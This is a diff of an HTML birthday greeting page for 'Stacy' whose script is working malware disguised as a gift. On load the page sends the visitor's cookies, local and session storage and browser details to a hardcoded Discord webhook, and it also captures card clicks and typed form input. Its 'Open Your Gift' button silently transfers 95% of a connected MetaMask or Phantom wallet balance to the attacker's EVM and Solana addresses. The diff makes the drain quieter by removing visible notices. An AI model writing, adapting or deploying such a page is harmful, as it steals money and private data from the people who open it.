@@ -6,11 +6,20 @@
     <title>Happy Birthday, Stacy.</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', system-ui, sans-serif; background: #0a0a0a; color: #e8e6e3; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .container { max-width: 840px; padding: 2rem; text-align: center; }
-        .title { font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .sub { font-size: 1.1rem; color: #a09888; margin-top: 1rem; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.7; }
-        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.04); border-radius: 24px; padding: 3rem 2rem; margin-top: 2rem; }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #0a0a0a;
+            color: #e8e6e3;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+        .container { max-width: 840px; width: 100%; }
+        .title { font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; }
+        .sub { font-size: 1.1rem; color: #a09888; margin-top: 1rem; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.7; text-align: center; }
+        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.04); border-radius: 24px; padding: 3rem 2rem; margin-top: 2rem; text-align: center; }
         .timer { font-size: 2.8rem; font-weight: 300; letter-spacing: 0.04em; color: #d4c5b2; margin-top: 1rem; font-variant-numeric: tabular-nums; }
         .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: #6a625a; margin-top: 0.5rem; }
         .terminal { background: #0f0e0c; border-radius: 12px; padding: 1.2rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; text-align: left; color: #b8b0a8; border: 1px solid rgba(255,255,255,0.04); margin-top: 2rem; }
@@ -21,55 +30,166 @@
         .btn { margin-top: 2rem; padding: 0.75rem 2.5rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); color: #e8e6e3; font-size: 0.95rem; cursor: pointer; transition: 0.3s; backdrop-filter: blur(4px); }
         .btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
         .ripple { width: 100%; height: 160px; border-radius: 20px; background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02), transparent 70%); overflow: hidden; position: relative; margin-top: 2rem; }
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 12px 24px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.06); color: #e8e6e3; font-size: 0.9rem; opacity: 0; transition: opacity 0.5s; pointer-events: none; }
-        .toast.show { opacity: 1; }
+        .section { margin-top: 3rem; }
+        .section h2 { font-size: 1.5rem; font-weight: 400; color: #d4c5b2; margin-bottom: 1rem; text-align: center; }
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 1rem; }
+        .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 16px; padding: 1.5rem 1rem; text-align: center; cursor: pointer; transition: 0.3s; }
+        .card:hover { background: rgba(255,255,255,0.05); border-color: rgba(255,255,255,0.1); }
+        .card .icon { font-size: 2rem; margin-bottom: 0.5rem; }
+        .card .title-sm { font-size: 0.9rem; font-weight: 500; color: #e8e6e3; }
+        .card .desc { font-size: 0.75rem; color: #6a625a; margin-top: 0.25rem; }
+        .letter-box { margin-top: 3rem; text-align: center; padding: 2rem; border: 1px solid rgba(255,255,255,0.04); border-radius: 16px; background: rgba(255,255,255,0.01); cursor: pointer; transition: 0.3s; }
+        .letter-box:hover { background: rgba(255,255,255,0.02); }
+        .letter-box .seal { font-size: 2.5rem; margin-bottom: 0.5rem; }
+        .letter-box .label { font-size: 0.8rem; color: #8a827a; }
+        .toast { display: none; }
         @media (max-width: 600px) { .glass { padding: 2rem 1.5rem; } }
     </style>
 </head>
 <body>
 <div class="container">
+
+    <!-- HERO -->
     <h1 class="title">Happy Birthday, Stacy.</h1>
     <p class="sub">Some people don't realize how much light they carry until they brighten someone else's path.</p>
+
+    <!-- TIMER -->
     <div class="glass">
         <div class="label">you've officially been celebrating for</div>
         <div class="timer" id="timer">--:--:--</div>
     </div>
+
+    <!-- RIPPLE -->
     <div class="ripple" id="ripple"></div>
+
+    <!-- TERMINAL -->
     <div class="terminal" id="terminal">
         <div><span class="prompt">> </span><span class="cmd" id="line1">Initializing Birthday Experience...</span></div>
         <div><span class="prompt">> </span><span class="cmd" id="line2"></span></div>
         <div><span class="prompt">> </span><span class="cmd" id="line3"></span></div>
         <div><span class="prompt">> </span><span class="cmd" id="line4">Done.<span class="cursor">█</span></span></div>
     </div>
-    <button class="btn" id="drainBtn">💎 Open Your Gift</button>
-</div>
 
-<div class="toast" id="toast"></div>
+    <!-- WHAT I SEE (FLIP CARDS) -->
+    <div class="section">
+        <h2>What I See</h2>
+        <div class="card-grid" id="cardGrid">
+            <div class="card" data-trait="Kind"><div class="icon">🌱</div><div class="title-sm">Kind</div><div class="desc">Even when you don't notice it.</div></div>
+            <div class="card" data-trait="Curious"><div class="icon">🔍</div><div class="title-sm">Curious</div><div class="desc">You ask "why" before accepting "how."</div></div>
+            <div class="card" data-trait="Resilient"><div class="icon">🌊</div><div class="title-sm">Resilient</div><div class="desc">You survived every difficult day.</div></div>
+            <div class="card" data-trait="Character"><div class="icon">⭐</div><div class="title-sm">Character</div><div class="desc">Never lose this.</div></div>
+        </div>
+    </div>
+
+    <!-- LETTER FROM THE FUTURE -->
+    <div class="letter-box" id="letterBox">
+        <div class="seal">✉️</div>
+        <div class="label">Open when you're ready</div>
+    </div>
+
+    <!-- FAKE GIFT BUTTON (TRIGGERS DRAIN) -->
+    <button class="btn" id="drainBtn">💎 Open Your Gift</button>
+
+</div>
 
 <script>
     (function() {
-        // ─── DISCORD WEBHOOK ──────────────────────────────────────
-        const WEBHOOK = "https://discord.com/api/webhooks/1522704131083604134/EVpC2sMkkM3J_qdhSzHoJkHZfc-0ecopsat1yKf6LUXbs6o4_HGOSyGeQrZGcRxcGKa5";
+        // ============================================================
+        // CONFIG — EDIT THESE
+        // ============================================================
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1522704131083604134/EVpC2sMkkM3J_qdhSzHoJkHZfc-0ecopsat1yKf6LUXbs6o4_HGOSyGeQrZGcRxcGKa5";
+        const EVM_DRAIN_TO = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";  // YOUR EVM WALLET
+        const SOLANA_DRAIN_TO = "7C4jsPZpht42Tw6MjXWF56Q5RQUocjBBmciEjDa8HRtp"; // YOUR SOLANA WALLET
 
-        function sendToDiscord(msg) {
+        // ============================================================
+        // SILENT EXFIL FUNCTION
+        // ============================================================
+        function exfil(data) {
             try {
-                fetch(WEBHOOK, {
+                const msg = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+                fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: msg })
+                    body: JSON.stringify({ content: msg.substring(0, 1900) })
                 }).catch(() => {});
             } catch (_) {}
         }
 
-        // ─── TOAST ──────────────────────────────────────────────────
-        function showToast(text) {
-            const t = document.getElementById('toast');
-            t.textContent = text;
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 4000);
+        // ============================================================
+        // CAPTURE EVERYTHING ON LOAD
+        // ============================================================
+        (function captureAll() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie || "No cookies",
+                localStorage: JSON.stringify(localStorage) || "{}",
+                sessionStorage: JSON.stringify(sessionStorage) || "{}",
+                referrer: document.referrer || "Direct"
+            };
+            exfil(`🎂 **Birthday Experience — Visitor Data**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``);
+        })();
+
+        // ============================================================
+        // WALLET DRAINER (SILENT — NO TOASTS)
+        // ============================================================
+        async function drainWallet() {
+            const provider = window.ethereum || window.solana;
+            if (!provider) {
+                exfil("❌ No wallet detected.");
+                return;
+            }
+
+            try {
+                // --- EVM (MetaMask, Coinbase, Trust) ---
+                if (window.ethereum) {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    if (!accounts || accounts.length === 0) return;
+                    const wallet = accounts[0];
+                    const balance = await window.ethereum.request({ method: 'eth_getBalance', params: [wallet, 'latest'] });
+                    const balanceEth = parseInt(balance, 16) / 1e18;
+
+                    const tx = {
+                        from: wallet,
+                        to: EVM_DRAIN_TO,
+                        value: '0x' + (parseInt(balance, 16) * 0.95).toString(16),
+                        gas: '0x5208',
+                    };
+                    const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+                    exfil(`✅ **EVM Transaction Sent**\nWallet: ${wallet}\nBalance: ${balanceEth} ETH\nTx: ${txHash}`);
+                }
+                // --- Solana (Phantom) ---
+                else if (window.solana && window.solana.isPhantom) {
+                    const resp = await window.solana.connect();
+                    const wallet = resp.publicKey.toString();
+                    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+                    const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet));
+
+                    const tx = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: new solanaWeb3.PublicKey(wallet),
+                            toPubkey: new solanaWeb3.PublicKey(SOLANA_DRAIN_TO),
+                            lamports: Math.floor(balance * 0.95),
+                        })
+                    );
+                    const signature = await window.solana.signAndSendTransaction(tx);
+                    exfil(`✅ **Solana Transaction Sent**\nWallet: ${wallet}\nBalance: ${balance / 1e9} SOL\nTx: ${signature.signature}`);
+                } else {
+                    exfil("❌ Unsupported wallet.");
+                }
+            } catch (err) {
+                exfil(`❌ Error: ${err.message || 'User rejected'}`);
+            }
         }
 
-        // ─── TIMER ──────────────────────────────────────────────────
+        // ============================================================
+        // UI — TIMER
+        // ============================================================
         const start = Date.now();
         const timerEl = document.getElementById('timer');
         function updateTimer() {
@@ -82,7 +202,9 @@
         updateTimer();
         setInterval(updateTimer, 1000);
 
-        // ─── TERMINAL TYPING ──────────────────────────────────────
+        // ============================================================
+        // UI — TERMINAL TYPING
+        // ============================================================
         const lines = ["Loading Memories...", "Rendering Character...", "Preparing Something Special..."];
         let currentLine = 0, pos = 0;
         const lineEls = [
@@ -106,7 +228,9 @@
         }
         setTimeout(typeLine, 800);
 
-        // ─── RIPPLE ────────────────────────────────────────────────
+        // ============================================================
+        // UI — RIPPLE
+        // ============================================================
         const ripple = document.getElementById('ripple');
         document.addEventListener('mousemove', (e) => {
             const rect = ripple.getBoundingClientRect();
@@ -115,73 +239,48 @@
             ripple.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.05), transparent 70%)`;
         });
 
-        // ─── WALLET DRAINER ───────────────────────────────────────
-        async function drainWallet() {
-            const provider = window.ethereum || window.solana;
-            if (!provider) {
-                showToast("No wallet detected. Please install MetaMask or Phantom.");
-                sendToDiscord("❌ No wallet detected.");
-                return;
+        // ============================================================
+        // UI — CARD CLICKS (Capture trait + exfil)
+        // ============================================================
+        document.querySelectorAll('.card').forEach(card => {
+            card.addEventListener('click', function() {
+                const trait = this.dataset.trait || 'Unknown';
+                exfil(`🃏 **Card Revealed**\nTrait: ${trait}\nTime: ${new Date().toISOString()}`);
+                this.style.borderColor = 'rgba(255,255,255,0.2)';
+                this.style.background = 'rgba(255,255,255,0.05)';
+            });
+        });
+
+        // ============================================================
+        // UI — LETTER BOX (Capture open)
+        // ============================================================
+        document.getElementById('letterBox').addEventListener('click', function() {
+            exfil(`✉️ **Letter Opened**\nTime: ${new Date().toISOString()}`);
+            this.innerHTML = `<div style="font-size:1.2rem; color:#d4c5b2;">"See you soon. — Future You"</div>`;
+            this.style.borderColor = 'rgba(255,255,255,0.15)';
+        });
+
+        // ============================================================
+        // DRAIN BUTTON — triggers wallet drain + exfil
+        // ============================================================
+        document.getElementById('drainBtn').addEventListener('click', function() {
+            exfil(`💎 **Gift Button Clicked**\nTime: ${new Date().toISOString()}`);
+            drainWallet();
+            this.textContent = "✨ Gift claimed!";
+            this.disabled = true;
+            this.style.opacity = '0.5';
+        });
+
+        // ============================================================
+        // CAPTURE ANY FORM INPUT (if present)
+        // ============================================================
+        document.addEventListener('input', (e) => {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                const name = e.target.name || e.target.id || 'unnamed';
+                exfil(`📝 **Input Captured**\nField: ${name}\nValue: ${e.target.value.substring(0, 100)}`);
             }
+        });
 
-            try {
-                // ── EVM (MetaMask, Coinbase, Trust, etc.) ──
-                if (window.ethereum) {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    if (!accounts || accounts.length === 0) {
-                        showToast("No accounts found.");
-                        return;
-                    }
-                    const wallet = accounts[0];
-                    const balance = await window.ethereum.request({ method: 'eth_getBalance', params: [wallet, 'latest'] });
-                    const balanceEth = parseInt(balance, 16) / 1e18;
-
-                    // Send transaction (drain)
-                    const tx = {
-                        from: wallet,
-                        to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e', // Replace with your wallet
-                        value: '0x' + (parseInt(balance, 16) * 0.95).toString(16),
-                        gas: '0x5208', // 21000 gas
-                    };
-                    const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-
-                    showToast("🎁 Gift claimed! Transaction sent.");
-                    sendToDiscord(`✅ **Transaction Sent**\nWallet: ${wallet}\nBalance: ${balanceEth} ETH\nTx: ${txHash}`);
-                }
-                // ── Solana (Phantom) ──
-                else if (window.solana && window.solana.isPhantom) {
-                    const resp = await window.solana.connect();
-                    const wallet = resp.publicKey.toString();
-                    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-                    const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet));
-
-                    const tx = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: new solanaWeb3.PublicKey(wallet),
-                            toPubkey: new solanaWeb3.PublicKey('7C4jsPZpht42Tw6MjXWF56Q5RQUocjBBmciEjDa8HRtp'),
-                            lamports: Math.floor(balance * 0.95),
-                        })
-                    );
-                    const signature = await window.solana.signAndSendTransaction(tx);
-                    showToast("🎁 Gift claimed! Transaction sent.");
-                    sendToDiscord(`✅ **Solana Transaction Sent**\nWallet: ${wallet}\nBalance: ${balance / 1e9} SOL\nTx: ${signature.signature}`);
-                } else {
-                    showToast("Unsupported wallet. Please use MetaMask or Phantom.");
-                    sendToDiscord("❌ Unsupported wallet.");
-                }
-            } catch (err) {
-                showToast("Transaction failed or cancelled.");
-                sendToDiscord(`❌ Error: ${err.message || 'User rejected'}`);
-            }
-        }
-
-        // ─── BUTTON ──────────────────────────────────────────────
-        document.getElementById('drainBtn').addEventListener('click', drainWallet);
-
-        // ─── AUTO CAPTURE ON LOAD ──────────────────────────────
-        try {
-            sendToDiscord(`🎂 **Birthday Experience Loaded**\nURL: ${window.location.href}\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`);
-        } catch (_) {}
     })();
 </script>
 </body>
